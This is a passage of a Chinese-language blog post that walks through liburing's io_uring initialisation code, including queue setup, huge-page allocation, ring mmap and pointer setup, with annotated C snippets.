href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">io_uring_set_up</a><br>返回值:</li><li>fd:           用来mmap的fd</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_init</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;p, <span class="number">0</span>, <span class="keyword">sizeof</span>(p));</span><br><span class="line">p.flags = flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> io_uring_queue_init_params(entries, ring, &amp;p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是一系列调用链:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--&gt;io_uring_queue_init</span><br><span class="line">--&gt;io_uring_queue_init_params</span><br><span class="line">--&gt;io_uring_queue_init_try_nosqarr</span><br><span class="line">--&gt;__io_uring_queue_init_params</span><br></pre></td></tr></table></figure><p>最后到 <code>__io_uring_queue_init_params</code></p><p>其中 p 是要传递给 <code>io_uring_setup</code> 的params,  buf 的使用将在后面分析.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __io_uring_queue_init_params(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span><br><span class="line"> <span class="keyword">struct</span> io_uring_params *p, <span class="type">void</span> *buf,</span><br><span class="line"> <span class="type">size_t</span> buf_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> fd, ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> *sq_array;</span><br><span class="line"><span class="type">unsigned</span> sq_entries, index;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The kernel does this check already, but checking it here allows us</span></span><br><span class="line"><span class="comment"> * to avoid handling it below.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY</span><br><span class="line">    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">// 如果设置了REGISTERED_FD_ONLY 就必须要设置 NO_MMAP</span></span><br></pre></td></tr></table></figure><p>对于设置了NO_MMAP的请求，通过 <code>io_uring_alloc_huge</code> 进行了预处理，这个函数我们将在之后[[#io_uring_alloc_huge]]进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &#123;</span><br><span class="line">ret = io_uring_alloc_huge(entries, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq,</span><br><span class="line">buf, buf_size);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">if</span> (buf)</span><br><span class="line">ring-&gt;int_flags |= INT_FLAG_APP_MEM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果设置了NO_MMAP，就要预先分配大内存</span></span><br></pre></td></tr></table></figure><p>接下来就是调用<code>io_uring_setup</code>  完成真正的初始化操作了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fd = __sys_io_uring_setup(entries, p);</span><br><span class="line"><span class="comment">// syscall(__NR_io_uring_setup, entries, p)</span></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &amp;&amp;</span><br><span class="line">    !(ring-&gt;int_flags &amp; INT_FLAG_APP_MEM)) &#123;</span><br><span class="line">__sys_munmap(ring-&gt;sq.sqes, <span class="number">1</span>);</span><br><span class="line">io_uring_unmap_rings(&amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 错误处理</span></span><br></pre></td></tr></table></figure><p>对于没有设置 NO_MMAP 的情形，需要在此时mmap为sq和cq在用户态映射内存[[#io_uring_queue_mmap]]，反之，直接设置ring相关指针[[#io_uring_setup_ring_pointers]]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_MMAP)) &#123;</span><br><span class="line">ret = io_uring_queue_mmap(fd, p, ring);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">__sys_close(fd);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">io_uring_setup_ring_pointers(p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，是将<code>io_uring_setup</code> 设置在 params 中的各种变量复制到用户态管理结构体ring中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sq_entries = ring-&gt;sq.ring_entries;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">sq_array = ring-&gt;sq.<span class="built_in">array</span>;</span><br><span class="line"><span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; sq_entries; index++)</span><br><span class="line">sq_array[index] = index;</span><br><span class="line">&#125;</span><br><span class="line">ring-&gt;features = p-&gt;features;</span><br><span class="line"><span class="comment">// io_uring 的 特性</span></span><br><span class="line">ring-&gt;flags = p-&gt;flags;</span><br><span class="line"><span class="comment">// io_uring 设置的标志</span></span><br><span class="line">ring-&gt;enter_ring_fd = fd;</span><br><span class="line"><span class="comment">// 返回的fd</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY) &#123;</span><br><span class="line">ring-&gt;ring_fd = <span class="number">-1</span>;</span><br><span class="line">ring-&gt;int_flags |= INT_FLAG_REG_RING | INT_FLAG_REG_REG_RING;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ring-&gt;ring_fd = fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-uring-alloc-huge"><code>io_uring_alloc_huge</code></h4><p><code>io_uring_alloc_huge</code> 是对于设置了NO_MMAP的程序，预先在用户态设置好SQ和CQ的内存的函数</p><p>首先是会用到的各种参数和变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_alloc_huge</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">       <span class="keyword">struct</span> io_uring_sq *sq, <span class="keyword">struct</span> io_uring_cq *cq,</span></span><br><span class="line"><span class="params">       <span class="type">void</span> *buf, <span class="type">size_t</span> buf_size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> page_size = get_page_size();</span><br><span class="line"><span class="type">unsigned</span> sq_entries, cq_entries;</span><br><span class="line"><span class="type">size_t</span> ring_mem, sqes_mem;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mem_used = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> *ptr;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来是首先确定了sq和eq entrie的数量。这里具体的算法就不在这里分析了，主要包括合法性检查和幂2向上取整的运算等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ret = get_sq_cq_entries(entries, p, &amp;sq_entries, &amp;cq_entries);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><p>接下来就是计算sq和cq需要的内存大小了，计算过程非常直观，笔者就不赘述了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqes_mem = sq_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe);</span><br><span class="line">sqes_mem = (sqes_mem + page_size - <span class="number">1</span>) &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">ring_mem = cq_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQE32)</span><br><span class="line">ring_mem *= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">ring_mem += sq_entries * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>);</span><br><span class="line">mem_used = sqes_mem + ring_mem;</span><br><span class="line">mem_used = (mem_used + page_size - <span class="number">1</span>) &amp; ~(page_size - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>接下来，就是真正决定sq和cq的用户态地址了。</p><p>首先，如果用户传入了buf，并且buf_size足够大， 那么就设置为用户buf</p><p>否则，就mmap出一片内存来使用（根据size计算的不同可能是4K也可能是4M，分别是一页和一个大页(二级页表对应的大小)）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!buf &amp;&amp; (sqes_mem &gt; huge_page_size || ring_mem &gt; huge_page_size))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buf) &#123;</span><br><span class="line"><span class="keyword">if</span> (mem_used &gt; buf_size)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">ptr = buf;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> map_hugetlb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (sqes_mem &lt;= page_size)</span><br><span class="line">buf_size = page_size;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">buf_size = huge_page_size;</span><br><span class="line">map_hugetlb = MAP_HUGETLB;</span><br><span class="line">&#125;</span><br><span class="line">ptr = __sys_mmap(<span class="literal">NULL</span>, buf_size, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_SHARED|MAP_ANONYMOUS|map_hugetlb,</span><br><span class="line"><span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;sqes = ptr;</span><br></pre></td></tr></table></figure><p>并以类似的方式设置了<code>sq-&gt;ring_ptr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mem_used &lt;= buf_size)</span><br><span class="line">&#123;</span><br><span class="line">sq-&gt;ring_ptr = (<span class="type">void</span> *)sq-&gt;sqes + sqes_mem;</span><br><span class="line"><span class="comment">/* clear ring sizes, we have just one mmap() to undo */</span></span><br><span class="line">cq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">sq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> map_hugetlb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ring_mem &lt;= page_size)</span><br><span class="line">buf_size = page_size;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">buf_size = huge_page_size;</span><br><span class="line">map_hugetlb = MAP_HUGETLB;</span><br><span class="line">&#125;</span><br><span class="line">ptr = __sys_mmap(<span class="literal">NULL</span>, buf_size, PROT_READ | PROT_WRITE,</span><br><span class="line"> MAP_SHARED | MAP_ANONYMOUS | map_hugetlb,</span><br><span class="line"> <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line">&#123;</span><br><span class="line">__sys_munmap(sq-&gt;sqes, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;ring_ptr = ptr;</span><br><span class="line">sq-&gt;ring_sz = buf_size;</span><br><span class="line">cq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过下面一部分就是真正重要的了：</p><p>p正是传入 <code>io_uring_setup</code> 的结构体，所以对p的赋值才是至关重要的，这里的sq和cq不过是 <code>liburing</code>  暴露给用户的管理结构 <code>io_uring</code> 中的一个成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cq-&gt;ring_ptr = (<span class="type">void</span> *)sq-&gt;ring_ptr;</span><br><span class="line">p-&gt;sq_off.user_addr = (<span class="type">unsigned</span> <span class="type">long</span>)sq-&gt;sqes;</span><br><span class="line">p-&gt;cq_off.user_addr = (<span class="type">unsigned</span> <span class="type">long</span>)sq-&gt;ring_ptr;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">int</span>)mem_used;</span><br></pre></td></tr></table></figure><p>所以规根结底就是写入了 p的 sq_off 和 cq_off</p><h4 id="io-uring-queue-mmap"><code>io_uring_queue_mmap</code></h4><p>这是对于没有设置NO_MMAP的情形下，完成了 syscall <code>io_uring_setup</code> 处理后，mmap的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_mmap</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">   <span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line"><span class="keyword">return</span> io_uring_mmap(fd, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是计算了sq和cq的ring的size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_mmap</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_sq *sq, <span class="keyword">struct</span> io_uring_cq *cq)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQE32)</span><br><span class="line">size += <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"></span><br><span class="line">sq-&gt;ring_sz = p-&gt;sq_off.<span class="built_in">array</span> + p-&gt;sq_entries * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>);</span><br><span class="line">cq-&gt;ring_sz = p-&gt;cq_off.cqes + p-&gt;cq_entries * size;</span><br></pre></td></tr></table></figure><p>然后开始mmap sq 和 cq ring的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (cq-&gt;ring_sz &gt; sq-&gt;ring_sz)</span><br><span class="line">sq-&gt;ring_sz = cq-&gt;ring_sz;</span><br><span class="line">cq-&gt;ring_sz = sq-&gt;ring_sz;</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;ring_ptr = __sys_mmap(<span class="number">0</span>, sq-&gt;ring_sz, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd,</span><br><span class="line">  IORING_OFF_SQ_RING);<span class="comment">// offset = 0</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sq-&gt;ring_ptr))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(sq-&gt;ring_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)</span><br><span class="line">&#123;</span><br><span class="line">cq-&gt;ring_ptr = sq-&gt;ring_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cq-&gt;ring_ptr = __sys_mmap(<span class="number">0</span>, cq-&gt;ring_sz, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd,</span><br><span class="line">  IORING_OFF_CQ_RING);</span><br><span class="line">  <span class="comment">// offset = 8000000 </span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(cq-&gt;ring_ptr))</span><br><span class="line">&#123;</span><br><span class="line">ret = PTR_ERR(cq-&gt;ring_ptr);</span><br><span class="line">cq-&gt;ring_ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置了 <code>IORING_FEAT_SINGLE_MMAP</code> ，就可以将sq 和 cq的ring一起mmap，否则，就分别单独mmap</p><p>最后再mmap sq的sqes</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">size += <span class="number">64</span>;</span><br><span class="line">sq-&gt;sqes = __sys_mmap(<span class="number">0</span>, size * p-&gt;sq_entries, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sq-&gt;sqes))</span><br><span class="line">&#123;</span><br><span class="line">ret = PTR_ERR(sq-&gt;sqes);</span><br><span class="line">err:</span><br><span class="line">io_uring_unmap_rings(sq, cq);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后的最后，设置相关指针 [[#io_uring_setup_ring_pointers]]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_uring_setup_ring_pointers(p, sq, cq);</span><br></pre></td></tr></table></figure><h4 id="io-uring-setup-ring-pointers">io_uring_setup_ring_pointers</h4><p>此函数用来设置 <code>struct io_uring ring</code>  也就是liburing的核心管理结构体.</p><p>我们知道 <code>sq-&gt;ring_ptr</code> 在 kernel被映射到一个内核结构体, 其中结构体各个成员的偏移通过 <code>io_uring_params</code>  的两个 <code>offset</code> 成员结构体返回, 这里通过此拿到结构体对应成员的指针, 并赋值给 <code>sq</code> 和 <code>cq</code> 的各个成员, 这里的 <code>sq</code> 和 <code>cq</code> 又是 管理结构体 <code>ring</code> 的成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_uring_setup_ring_pointers</span><span class="params">(<span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_sq *sq,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_cq *cq)</span></span><br><span class="line">&#123;</span><br><span class="line">sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head;</span><br><span class="line"><span class="comment">// 设置sq head的指针</span></span><br><span class="line">sq-&gt;ktail = sq-&gt;ring_ptr + p-&gt;sq_off.tail;</span><br><span class="line"><span class="comment">// 设置sq tail指针</span></span><br><span class="line">sq-&gt;kring_mask = sq-&gt;ring_ptr + p-&gt;sq_off.ring_mask;</span><br><span class="line">sq-&gt;kring_entries = sq-&gt;ring_ptr + p-&gt;sq_off.ring_entries;</span><br><span class="line"><span class="comment">// 设置sq entries个数</span></span><br><span class="line">sq-&gt;kflags = sq-&gt;ring_ptr + p-&gt;sq_off.flags;</span><br><span class="line"><span class="comment">// 设置对应标志</span></span><br><span class="line">sq-&gt;kdropped = sq-&gt;ring_ptr + p-&gt;sq_off.dropped;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">sq-&gt;<span class="built_in">array</span> = sq-&gt;ring_ptr + p-&gt;sq_off.<span class="built_in">array</span>;</span><br><span class="line"><span class="comment">// 如果存在sqarray</span></span><br><span class="line">cq-&gt;khead = cq-&gt;ring_ptr + p-&gt;cq_off.head;</span><br><span class="line"><span class="comment">// 设置cq head指针</span></span><br><span class="line">cq-&gt;ktail = cq-&gt;ring_ptr + p-&gt;cq_off.tail;</span><br><span class="line"><span class="comment">// 设置cq tail指针</span></span><br><span class="line">cq-&gt;kring_mask = cq-&gt;ring_ptr + p-&gt;cq_off.ring_mask;</span><br><span class="line">cq-&gt;kring_entries = cq-&gt;ring_ptr + p-&gt;cq_off.ring_entries;</span><br><span class="line">cq-&gt;koverflow = cq-&gt;ring_ptr + p-&gt;cq_off.overflow;</span><br><span class="line">cq-&gt;cqes = cq-&gt;ring_ptr + p-&gt;cq_off.cqes;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_off.flags)</span><br><span class="line">cq-&gt;kflags = cq-&gt;ring_ptr + p-&gt;cq_off.flags;</span><br><span class="line"></span><br><span class="line">sq-&gt;ring_mask = *sq-&gt;kring_mask;</span><br><span class="line">sq-&gt;ring_entries = *sq-&gt;kring_entries;</span><br><span class="line">cq-&gt;ring_mask = *cq-&gt;kring_mask;</span><br><span class="line">cq-&gt;ring_entries = *cq-&gt;kring_entries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-get-sqe"><code>io_uring_get_sqe</code></h3><p>此函数用来获取一个可用 <code>sqe</code> 用来提交任务，最终是调用了  <code>_io_uring_get_sqe</code>， 整个函数用非常优雅的方式实现了循环队列// #Elegant</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *_<span class="title">io_uring_get_sqe</span>(<span class="keyword">struct</span> <span class="title">io_uring</span> *<span 